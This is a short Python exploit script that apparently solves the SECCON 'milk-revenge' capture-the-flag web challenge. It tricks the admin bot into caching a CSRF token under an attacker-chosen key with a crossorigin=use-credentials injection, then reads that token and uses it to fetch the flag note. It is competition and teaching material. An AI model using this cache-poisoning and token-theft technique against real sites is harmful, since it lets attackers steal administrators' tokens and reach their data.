import requests
import random, string
import re
import time
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings (InsecureRequestWarning)

#front_url = "https://milk.chal.seccon.jp" 
front_url = "https://milk-revenge.chal.seccon.jp" 
#api_url = "https://milk-api.chal.seccon.jp" " 
api_url = " https://milk-revenge-api.chal.seccon.jp"

cache_key = '' .join (random.choices (string.ascii_lowercase, k = 32 ))
 #proxies = {"http": "http: // localhost: 8080", "https": "http: // localhost: 8080 "}
proxies = {}
# data = {"url" : front_url + './note.php?_=% scrossorigin=use-credentials' % (cache_key)}

data = {
	"url" : front_url + f'./note.php?_={cache_key} crossorigin=use-credentials'
}

# / report request 
print( "-send report" )
r = requests.post (front_url + '/report' , data=data, proxies=proxies)

print(r.url)

# You need to wait a bit for the administrator's request to finish. 
time.sleep (10)

params = {
	"_": cache_key
}

headers = {
	"Referer": front_url
}

# CSRF 
print ( "-check token" )
response = requests.get(api_url + '/csrf-token' , params = params, headers = headers)
r = str(response.text)
csrf_token = re.findall(r"'(.*?)'", r)[0]
print (f"Token:{csrf_token}")

params = {
	"token": csrf_token
}

headers = {
	"Referer": front_url
}

# Use the confirmed CSRF token to access / note / flag 
print ( "-get / note / flag" )
r = requests.get (api_url + "/notes/flag" , params = params, headers = headers)
print (r.text)
print(r.status_code)